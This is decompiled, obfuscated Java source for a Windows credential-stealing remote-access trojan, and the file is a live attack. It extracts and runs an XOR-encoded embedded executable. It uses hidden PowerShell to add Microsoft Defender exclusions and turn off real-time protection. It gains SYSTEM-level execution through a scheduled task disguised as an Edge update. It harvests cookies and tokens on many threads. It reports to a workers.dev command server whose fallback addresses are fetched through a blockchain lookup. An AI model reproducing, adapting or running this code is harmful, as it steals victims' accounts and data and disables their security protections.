package aurora;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Crypt32;
import com.sun.jna.platform.win32.Crypt32Util;
import com.sun.jna.platform.win32.Win32Exception;
import com.sun.jna.platform.win32.WinReg;
import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;
import com.sun.jna.platform.win32.WinReg.HKEY;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.lang.Thread.UncaughtExceptionHandler;
import java.lang.management.OperatingSystemMXBean;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.CopyOption;
import java.nio.file.DirectoryStream;
import java.nio.file.FileVisitOption;
import java.nio.file.InvalidPathException;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.security.CodeSource;
import java.security.GeneralSecurityException;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.TimeZone;
import java.util.Vector;
import java.util.Map.Entry;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.jar.JarFile;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import javax.websocket.ClientEndpoint;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import org.apache.commons.io.FileUtils;
import org.glassfish.tyrus.client.ClientManager;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.sqlite.JDBC;

@ClientEndpoint
public class prawn {
   private static final boolean pavilion = false;
   private static volatile String delta;
   private static final AtomicInteger fragment = new AtomicInteger();
   private static final Set<String> ferret = java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap());
   private static final int cellar = 6;
   public static final String quill = "1.0";
   static String jockey = "";
   static String sparrow = System.getProperty("user.name");
   static String lumber = new StringBuilder().append("\\rat-").append(sparrow).toString();
   static String cobalt;
   static String lantern;
   static File pebble;
   static String saffron;
   static String paprika;
   static Boolean bishop = Boolean.FALSE;
   static String[] pomegranate;
   static File lupine;
   private static final String misty = "http://localhost:9222/json";
   static String maple;
   public static File hornet;
   static File hammer;
   static File pollen;
   static File silver;
   static File granite;
   static File phoenix;
   static File midnight;
   static String pilot;
   static String nourish;
   static String kimono;
   static String paddle;
   static String jasmine;
   static String ninja;
   static String parcel;
   static String oregano;
   static String bison;
   static String chimney;
   static String moonbeam;
   static String nebula;
   public static String serene;
   public static String poplar;
   static File mimic;
   static File carpet;
   static File mantis;
   static File bullet;
   static File olive;
   static File helmet;
   static String nectar;
   static String satchel;
   static String plato;
   static String fossil;
   static String shrimp;
   static String rapids;
   static String harbor;
   static String pelican;
   static String rosin;
   static String squid;
   static String mitten;
   static String ladder;
   static File stealth;
   static File pumpkin;
   static File pulley;
   static File hermit;
   static File receipt;
   static File dolphin;
   static File rook;
   static String jungle;
   static String coffee;
   static String castle;
   static String motif;
   static String cedar;
   static String ledger;
   static String hamlet;
   static String shrub;
   static String lagoon;
   static String bottle;
   static String rosemary;
   static String mandala;
   static String pancake;
   static String puffin;
   static Path modern;
   static Path sloth;
   static String potato;
   static File medley;
   static boolean saddle = true;
   static boolean meadow = true;
   static boolean stigma = true;
   static boolean lattice = true;
   static boolean panther = true;
   static boolean kaiser = true;
   static boolean fennel = true;
   static boolean colony = true;
   static boolean scorpion = true;
   static boolean buffer = true;
   static boolean memoir = true;
   static boolean ivory = true;
   static boolean bridge = true;
   static boolean piano = true;
   static boolean sorghum = true;
   static boolean rudder = true;
   static boolean silo = true;
   static boolean stingray = true;
   static boolean millet = true;
   static boolean rustic = true;
   static boolean narwhal = true;
   static boolean gasket = true;
   static boolean jasper = true;
   static boolean mallet = true;
   static boolean sapphire = true;
   static boolean lyric = true;
   static boolean parchment = true;
   static boolean dagger = true;
   static boolean raccoon = true;
   static boolean piranha = true;
   static boolean stucco = true;
   static boolean lemon = true;
   static boolean oriole = true;
   static boolean mailman = true;
   static boolean lobster = true;
   static boolean herald = true;
   static boolean rabbit = true;
   static boolean clover = true;
   static boolean nimbus = true;
   static boolean breeze = true;
   static boolean lentil = true;
   static boolean mint = true;
   static boolean indigo = true;
   static boolean copper = true;
   static boolean frosty = true;
   static boolean enigma = true;
   static boolean hoopoe = true;
   static boolean stellar = true;
   static boolean daisy = true;
   static boolean storm = true;
   static boolean citrus = true;
   static boolean lizard = true;
   static boolean mustard = true;
   static boolean camera = true;
   static boolean rosewood = true;
   static boolean relic = true;
   static boolean filter = true;
   static boolean sawdust = true;
   static boolean impala = true;
   static boolean nugget = true;
   static boolean string = true;
   static boolean bounty = true;
   static boolean grape = true;
   static boolean juniper = true;
   static boolean crimson = true;
   static boolean sailor = true;
   static boolean geyser = true;
   static boolean scarf = true;
   static boolean omelet = true;
   static boolean pixel = true;
   static boolean cougar = true;
   static boolean metro = true;
   static boolean skillet = true;
   static boolean donkey = true;
   static boolean pilgrim = true;
   static final Map<String, String> reveal = new java.util.LinkedHashMap();
   private static final Pattern gypsum;
   private static final String origami = "https://telemetry-relay.kartohaantoha36-6a9.workers.dev";
   private static final String[] shell;
   private static final String roast = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";
   private static final String[] quartz;
   private static final Pattern ocean;
   private static final String[] mango;
   private static final String[] field;
   private static final String[] jewel;
   private static final String[] fathom;
   private static final int garnet = 20;
   private static final int obelisk = 45;
   private static final int opal = 350;
   private static final int physics = 500;
   private static final int marmot = 10000;
   private static PrintWriter mosaic;
   private static File raft;
   private static final ThreadLocal<StringBuilder> papaya;
   public static final Driver lavender;
   public static final String emerald = "\t";
   public static Gson bronze;
   private Session scooter;
   public static String orange;
   static String obsidian;
   private final Map<Integer, String> prism = new java.util.concurrent.ConcurrentHashMap();
   private static final int offset = 32;
   private static final int canyon = 3;
   private static sherbet sponge;
   static Map<String, String> sage;
   static String orient;
   static String hunter;
   static String signal;
   private static final Set<String> pistol;
   public static final String penguin;
   public static final String mineral;
   private static final List<String> rodeo;
   private static final List<String> portal;
   private static final ObjectMapper sleigh;
   private static final Pattern quail;
   public static final Pattern salmon;
   private static final int lasso = 12;
   private static final int cherry = 5;
   private static final int crystal = 3;
   private static final int linen = 12;
   private static final int butter = 15;
   private static final int limber = 128;
   private static final Pattern parachute;
   private static final Pattern picnic;
   private static final int digital = 1;
   static String blanket;
   private static final ObjectMapper cartoon;

   private static HttpURLConnection cosmos(URL var0, String var1, int var2, int var3) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HttpURLConnection var4 = (HttpURLConnection)var0.openConnection();
      var4.setRequestMethod(var1);
      var4.setConnectTimeout(var2);
      var4.setReadTimeout(var3);
      return var4;
   }

   static String spindle() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = delta;
      if (var0 != null) {
         return var0;
      }

      try {
         String var1 = journey("8");
         if (var1 != null) {
            var1 = basil(var1);
            if (!var1.isEmpty()) {
               delta = var1;
               return var1;
            }
         }
      } catch (Throwable var3) {
      }

      try {
         if (blanket != null && !blanket.isEmpty()) {
            return delta = basil(blanket);
         }
      } catch (Throwable var2) {
      }

      return null;
   }

   static void podium(String var0, String var1, String var2, Throwable var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var4 = spindle();
         if (var4 == null || var4.isEmpty()) {
            return;
         }

         if (fragment.get()
            >= 6) {
            return;
         }

         String var5 = new StringBuilder().append(var0).append("|").append(var2).toString();
         if (!ferret.add(var5)
            )
          {
            return;
         }

         if (fragment.incrementAndGet()
            > 6) {
            return;
         }

         StringBuilder var6 = new StringBuilder();
         if (var3 != null) {
            var6.append(var3.getClass().getName()).append(": ").append(var3.getMessage()).append('\n');
            StackTraceElement[] var7 = var3.getStackTrace();

            for (int var8 = 0; var8 < var7.length && var8 < 12; var8++) {
               var6.append("  at ").append(var7[var8]).append('\n');
            }

            Throwable var11 = var3.getCause();
            if (var11 != null) {
               var6.append("caused by ").append(var11.getClass().getName()).append(": ").append(var11.getMessage());
            }
         }

         Thread var10 = new Thread(() -> {
               if (rkjsezrwcf.jzdety() != 0) {
                  rkjsezrwcf.bbsnvj();
               }

               HttpURLConnection var5x = null;
               boolean var15 = false /* VF: Semaphore variable */;

               label104: {
                  try {
                     var15 = true;
                     String var6x = new StringBuilder().append("{\"src\":\"backpussy\",\"level\":").append(finch(var1)).append(",\"where\":").append(finch(var0)).append(",\"key\":").append(finch(jockey)).append(",\"v\":").append(finch("1.0")).append(",\"pc\":").append(finch(potato)).append(",\"os\":").append(finch(
                                             System.getProperty("os.name")
                                          )).append(",\"msg\":").append(finch(var2)).append(",\"stack\":").append(finch(
                                 var6.toString()
                              )).append("}").toString();
                     var5x = (HttpURLConnection)new URL(new StringBuilder().append(var4).append("/error").toString()).openConnection();
                     var5x.setRequestMethod("POST");
                     var5x.setConnectTimeout(5000);
                     var5x.setReadTimeout(5000);
                     var5x.setDoOutput(true);
                     var5x.setRequestProperty("Content-Type", "application/json");
                     var5x.setRequestProperty("User-Agent", "Mozilla/5.0");
                     OutputStream var7x = var5x.getOutputStream();

                     try {
                        var7x.write(var6x.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                     } catch (Throwable var17) {
                        if (var7x != null) {
                           try {
                              var7x.close();
                           } catch (Throwable var16) {
                              var17.addSuppressed(var16);
                           }
                        }

                        throw var17;
                     }

                     if (var7x != null) {
                        var7x.close();
                     }

                     var5x.getResponseCode();
                     var15 = false;
                     break label104;
                  } catch (Throwable var18) {
                     var15 = false;
                  } finally {
                     if (var15) {
                        if (var5x != null) {
                           var5x.disconnect();
                        }
                     }
                  }

                  if (var5x != null) {
                     var5x.disconnect();
                  }

                  return;
               }

               if (var5x != null) {
                  var5x.disconnect();
               }
            }, "err-report");
         var10.setDaemon(true);
         var10.start();
      } catch (Throwable var9) {
      }
   }

   static void shovel(String var0, Throwable var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      podium(
         var0,
         "error",
         var1 == null
            ? "unknown"
            : String.valueOf(var1.getMessage()),
         var1
      );
   }

   static String finch(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         return "\"\"";
      }

      StringBuilder var1 = new StringBuilder("\"");

      for (int var2 = 0; var2 < var0.length(); var2++) {
         char var3 = var0.charAt(var2);
         switch (var3) {
            case '\t':
               var1.append("\\t");
               break;
            case '\n':
               var1.append("\\n");
               break;
            case '\r':
               var1.append("\\r");
               break;
            case '"':
               var1.append("\\\"");
               break;
            case '\\':
               var1.append("\\\\");
               break;
            default:
               if (var3 < ' ') {
                  var1.append(String.format("\\u%04x", new Object[]{
                           Integer.valueOf(var3)
                        }));
               } else {
                  var1.append(var3);
               }
         }
      }

      return var1.append('"').toString();
   }

   static void mesa(String var0, String[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var2 = System.getenv("APPDATA");
         if (var2 != null) {
            File var3 = new File(var2, "Microsoft/SecurityUpdates");
            var3.mkdirs();
            String var4 = System.getenv("WINDIR");
            File var5 = new File(System.getProperty("java.io.tmpdir"), new StringBuilder().append("upd_").append(Long.toHexString(new java.util.Random().nextLong())).append(".exe").toString());
            var5.delete();
            InputStream var6 = prawn.class.getResourceAsStream("/nyx.bin");

            label153: {
               try {
                  if (var6 == null) {
                     break label153;
                  }

                  ByteArrayOutputStream var7 = new java.io.ByteArrayOutputStream();
                  byte[] var8 = new byte[1 << 16 | (char)0];

                  int var9;
                  while (
                     (var9 = var6.read(var8)) != -1
                  ) {
                     var7.write(var8, 0, var9);
                  }

                  byte[] var10 = var7.toByteArray();

                  for (int var11 = 0; var11 < var10.length; var11++) {
                     var10[var11] = (byte)(var10[var11] ^ 90);
                  }

                  FileOutputStream var30 = new java.io.FileOutputStream(var5);

                  try {
                     var30.write(var10);
                  } catch (Throwable var19) {
                     try {
                        var30.close();
                     } catch (Throwable var16) {
                        var19.addSuppressed(var16);
                     }

                     throw var19;
                  }

                  var30.close();
               } catch (Throwable var21) {
                  if (var6 != null) {
                     try {
                        var6.close();
                     } catch (Throwable var15) {
                        var21.addSuppressed(var15);
                     }
                  }

                  throw var21;
               }

               if (var6 != null) {
                  var6.close();
               }

               String var23 = new StringBuilder().append(System.getProperty("java.home")).append("\\bin\\java.exe").toString();
               String var24 = new File(prawn.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
               StringBuilder var25 = new StringBuilder("-jar \"").append(var24).append('"');

               for (String var12 : var1) {
                  var25.append(' ').append('"').append(var12.replace("\"", "\\\"")).append('"');
               }

               ProcessBuilder var27 = new ProcessBuilder(new String[]{
                     var5.getAbsolutePath(),
                     "--run",
                     var23,
                     "--tag",
                     var0,
                     "--target-args",
                     var25.toString(),
                     "--wait-ms",
                     "4000"
                  });
               var27.redirectErrorStream(true);
               Process var29 = var27.start();
               InputStream var32 = var29.getInputStream();

               try {
                  byte[] var33 = new byte[8192];

                  while (var32.read(var33) != -1) {
                  }
               } catch (Throwable var20) {
                  if (var32 != null) {
                     try {
                        var32.close();
                     } catch (Throwable var14) {
                        var20.addSuppressed(var14);
                     }
                  }

                  throw var20;
               }

               if (var32 != null) {
                  var32.close();
               }

               if (var29.waitFor() == 0) {
                  try {
                     var5.delete();
                  } catch (Throwable var18) {
                  }

                  System.exit(0);
               }

               try {
                  var5.delete();
               } catch (Throwable var17) {
               }

               return;
            }

            if (var6 != null) {
               var6.close();
            }
         }
      } catch (Throwable var22) {
      }
   }

   static void jigsaw() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         StringBuilder var0 = new StringBuilder();
         String var1 = System.getenv("APPDATA");
         if (var1 != null) {
            var0.append("'").append(var1).append("\\Microsoft\\SecurityUpdates',");
         }

         File var2 = new File("C:\\Users");
         File[] var3 = var2.listFiles();
         if (var3 != null) {
            for (File var7 : var3) {
               File var8 = new File(var7, "AppData\\Roaming\\Microsoft\\SecurityUpdates");
               if (var8.isDirectory()) {
                  var0.append("'").append(var8.getAbsolutePath()).append("',");
               }
            }
         }

         String var16 = System.getProperty("java.io.tmpdir");
         if (var16 != null) {
            var0.append("'").append(var16).append("',");
         }

         String var17 = var0.length() == 0
            ? "''"
            : var0.substring(0, var0.length() - 1);
         String var18 = new StringBuilder().append(var16 == null ? "C:\\Windows\\Temp" : var16).append("\\defender.log").toString();
         String var19 = new StringBuilder().append("try{Start-Transcript -Path '").append(var18).append("' -Force | Out-Null}catch{};try{Add-MpPreference -ExclusionPath @(").append(var17).append(") -ErrorAction Continue}catch{};try{Add-MpPreference -ExclusionProcess 'java.exe' -ErrorAction Continue}catch{};try{Add-MpPreference -ExclusionProcess 'javaw.exe' -ErrorAction Continue}catch{};try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Continue}catch{};try{reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f | Out-Null}catch{};try{Get-MpComputerStatus | Select-Object IsTamperProtected,RealTimeProtectionEnabled | Out-String}catch{};try{Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Out-String}catch{};try{Stop-Transcript | Out-Null}catch{}").toString();
         ProcessBuilder var20 = new ProcessBuilder(new String[]{
               "powershell.exe",
               "-NoProfile",
               "-NonInteractive",
               "-WindowStyle",
               "Hidden",
               "-ExecutionPolicy",
               "Bypass",
               "-Command",
               var19
            });
         var20.redirectErrorStream(true);
         Process var9 = var20.start();
         InputStream var10 = var9.getInputStream();

         try {
            byte[] var11 = new byte[8192];

            while (var10.read(var11) != -1) {
            }
         } catch (Throwable var14) {
            if (var10 != null) {
               try {
                  var10.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }
            }

            throw var14;
         }

         if (var10 != null) {
            var10.close();
         }

         var9.waitFor(40, java.util.concurrent.TimeUnit.SECONDS);
      } catch (Throwable var15) {
      }
   }

   static void poppy(String[] var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = System.getenv("WINDIR");
         File var2 = new File(
            new StringBuilder().append(var1 == null ? "C:\\Windows" : var1).append("\\Temp").toString()
         );
         File var3 = new File(var2, new StringBuilder().append("nyx_").append(Long.toHexString(new java.util.Random().nextLong())).append(".cmd").toString());
         String var4 = new StringBuilder().append(System.getProperty("java.home")).append("\\bin\\java.exe").toString();
         String var5 = new File(prawn.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         StringBuilder var6 = new StringBuilder("@echo off\r\n");
         var6.append("echo 1> \"C:\\Windows\\Temp\\nyx.back.system\"\r\n");
         var6.append('"').append(var4).append("\" -jar \"").append(var5).append('"');

         for (String var10 : var0) {
            var6.append(" \"").append(var10).append('"');
         }

         var6.append("\r\n");
         java.nio.file.Files.write(var3.toPath(), var6.toString().getBytes("UTF-8"), new OpenOption[0]);
         String var16 = "MicrosoftEdgeUpdateTaskMachineCore";
         ProcessBuilder var17 = new ProcessBuilder(new String[]{
               "schtasks",
               "/create",
               "/tn",
               var16,
               "/tr",
               var3.getAbsolutePath(),
               "/sc",
               "once",
               "/st",
               "00:00",
               "/ru",
               "SYSTEM",
               "/f"
            });
         var17.redirectErrorStream(true);
         Process var18 = var17.start();
         InputStream var19 = var18.getInputStream();

         try {
            byte[] var11 = new byte[4096];

            while (var19.read(var11) != -1) {
            }
         } catch (Throwable var14) {
            if (var19 != null) {
               try {
                  var19.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }
            }

            throw var14;
         }

         if (var19 != null) {
            var19.close();
         }

         var18.waitFor();
         new ProcessBuilder(new String[]{
                     "schtasks",
                     "/run",
                     "/tn",
                     var16
                  }).start().waitFor();
         Thread.sleep(3000);
         new ProcessBuilder(new String[]{
                  "schtasks",
                  "/delete",
                  "/tn",
                  var16,
                  "/f"
               }).start();
      } catch (Throwable var15) {
      }
   }

   public static void main(String[] var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = System.getenv("WINDIR");
         File var2 = new File(
            new StringBuilder().append(var1 == null ? "C:\\Windows" : var1).append("\\Temp").toString()
         );
         File var3 = new File(var2, "nyx.back.system");
         File var4 = new File(var2, "nyx.back.high");
         if (var3.exists()) {
            var3.delete();
            jigsaw();
            return;
         }

         if (var4.exists()) {
            var4.delete();
            poppy(var0);
         }
      } catch (Throwable var5) {
      }

      System.out.println("Hello world!\nNothing more...");
      Thread.setDefaultUncaughtExceptionHandler(new UncaughtExceptionHandler() {
            public void noble(Thread var1, Throwable var2) {
               if (rkjsezrwcf.jzdety() != 0) {
                  rkjsezrwcf.bbsnvj();
               }

               prawn.podium(
                  new StringBuilder().append("thread:").append(var1.getName()).toString(),
                  "fatal",
                  new StringBuilder().append("uncaught: ").append(var2).toString(),
                  var2
               );

               try {
                  var2.printStackTrace();
               } catch (Throwable var4) {
               }
            }
         });
      prawn var6 = new prawn();
      if (var0.length == 4) {
         var6.peony(
            var0[0],
            var0[1],
            var0[2],
            var0[3].replace("=", "")
         );
      }
   }

   public void peony(String var1, String var2, String var3, String var4) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var5;
      if (var4.startsWith("30e3267e-d80c-4a8f-84e2-bb475930a37c")) {
         var5 = var4.substring("30e3267e-d80c-4a8f-84e2-bb475930a37c".length());
         var4 = "30e3267e-d80c-4a8f-84e2-bb475930a37c";
      } else {
         var5 = "";
      }

      try {
         PrintStream var6 = new java.io.PrintStream(new StringBuilder().append(lantern).append("\\Log.txt").toString());

         try {
            System.setOut(var6);
            System.setErr(var6);
            jockey = var4;

            try {
               String var7 = journey("3");
               if (var7 != null) {
                  var7 = basil(var7);
                  if (!var7.isEmpty()) {
                     blanket = var7;
                  }
               }
            } catch (Exception var19) {
            }

            nsscsm(var4);
            ExecutorService var25 = java.util.concurrent.Executors.newFixedThreadPool(12);
            ArrayList var8 = new java.util.ArrayList();
            String var9 = var4;
            Future var10 = var25.submit(() -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  nyyzth();
               });
            var8.add(var10);
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     autumn();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     slvgmv();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     opoopb();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     asunhf();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     this.zrhvli();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     kqlsdl();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     this.atlas();
                  }));
            Future var11 = var25.submit(() -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  zmrkny();
               });
            var8.add(var11);
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     rambler.main();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     xdufbx();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     fyookr();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     qahoes();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     fwgqhz();
                  }));
            var8.add(var25.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     hishmh(var9, var5);
                  }));
            var25.shutdown();

            try {
               if (var11 != null) {
                  try {
                     var11.get(5, java.util.concurrent.TimeUnit.MINUTES);
                  } catch (TimeoutException var17) {
                     System.out.println("Cookie collection timed out (5 min)");
                  } catch (Exception var18) {
                     System.out.println(new StringBuilder().append("Cookie collection error: ").append(var18).toString());
                  }
               }

               if (var10 != null) {
                  try {
                     var10.get(120, java.util.concurrent.TimeUnit.SECONDS);
                  } catch (TimeoutException var15) {
                     System.out.println("SystemInfo timed out (120 s)");
                  } catch (Exception var16) {
                     System.out.println(new StringBuilder().append("SystemInfo error: ").append(var16).toString());
                  }
               }

               if (!var25.awaitTermination(20, java.util.concurrent.TimeUnit.SECONDS)) {
                  System.out.println("Error something dont work.");

                  for (int var12 = 0; var12 < var8.size(); var12++) {
                     Future var13 = (Future)var8.get(var12);
                     if (!var13.isDone()
                        )
                      {
                        System.out.println(new StringBuilder().append("Work ").append(var12).append(" dont work.").toString());
                     }
                  }
               }
            } catch (InterruptedException var20) {
               var20.printStackTrace();
            }

            if (!bishop.booleanValue()) {
               medley.delete();
            }

            System.out.println("All okay.");
            sprout(
               String.format("{ \"name\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"pcName\": \"%s\", \"key\": \"%s\" }", new Object[]{
                     var1,
                     var2,
                     var3,
                     potato,
                     new StringBuilder().append(var4).append(var5).toString()
                  })
            );
         } catch (Throwable var21) {
            try {
               var6.close();
            } catch (Throwable var14) {
               var21.addSuppressed(var14);
            }

            throw var21;
         }

         var6.close();
      } catch (FileNotFoundException var22) {
         var22.printStackTrace();
         shovel("maybestart/log-file", var22);
      } catch (Throwable var23) {
         var23.printStackTrace();
         shovel("maybestart", var23);
      }
   }

   private static byte[] stable(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var1 = new byte[var0.length() / 2];

      for (int var2 = 0; var2 < var1.length; var2++) {
         var1[var2] = (byte)(
            java.lang.Character.digit(var0.charAt(var2 * 2), 16)
                  << 4
               | java.lang.Character.digit(var0.charAt(var2 * 2 + 1), 16)
         );
      }

      return var1;
   }

   private static long satin(byte[] var0, int var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      long var3 = 0L;

      for (int var5 = 0; var5 < var2; var5++) {
         var3 = var3 << 8 | var0[var1 + var5] & 255;
      }

      return var3;
   }

   private static String squash(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var1 = stable(var0);
      int var2 = 4;
      int var3 = var1[var2++] & 255;
      int var4 = var3 & 7;
      int var5 = var1[var2++] & 255;
      int var6 = (int)satin(var1, var2, var4);
      var2 += var4;
      int var7 = (int)satin(var1, var2, var4);
      var2 += var4;
      var2 += var4 + var5 + var7 * var4;
      if ((var3 & 128) != 0) {
         var2 += var6 * var5;
      }

      int var18 = ++var2;
      var2++;
      int var8 = var1[var18] & 255;
      int var9 = (var8 + 1) / 2;
      return new String(var1, var2, var9, java.nio.charset.StandardCharsets.UTF_8);
   }

   static String ruby() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = spiral(8);
      if (var0 != null
         && var0.startsWith("http")) {
         return var0;
      }

      for (String var4 : shell) {
         if (var4 != null
            && var4.startsWith("http")) {
            return var4;
         }
      }

      return "https://telemetry-relay.kartohaantoha36-6a9.workers.dev";
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static String spiral(int var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append("{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"").append(var0).append("\"]]}").toString();

      for (String var5 : quartz) {
         int var6 = 1;

         while (var6 <= 3) {
            HttpURLConnection var7 = null;
            boolean var17 = false /* VF: Semaphore variable */;

            String var24;
            label165: {
               label166: {
                  try {
                     var17 = true;
                     var7 = (HttpURLConnection)new URL(var5).openConnection();
                     var7.setRequestMethod("POST");
                     var7.setDoOutput(true);
                     var7.setConnectTimeout(15000);
                     var7.setReadTimeout(30000);
                     var7.setRequestProperty("Content-Type", "application/json");
                     OutputStream var8 = var7.getOutputStream();

                     try {
                        var8.write(var1.getBytes(java.nio.charset.StandardCharsets.UTF_8));
                     } catch (Throwable var20) {
                        if (var8 != null) {
                           try {
                              var8.close();
                           } catch (Throwable var19) {
                              var20.addSuppressed(var19);
                           }
                        }

                        throw var20;
                     }

                     if (var8 != null) {
                        var8.close();
                     }

                     String var23 = beacon(
                        var7.getInputStream()
                     );
                     Matcher var9 = java.util.regex.Pattern.compile("\"b64\":\"([A-Za-z0-9+/=]+)\"").matcher(var23);
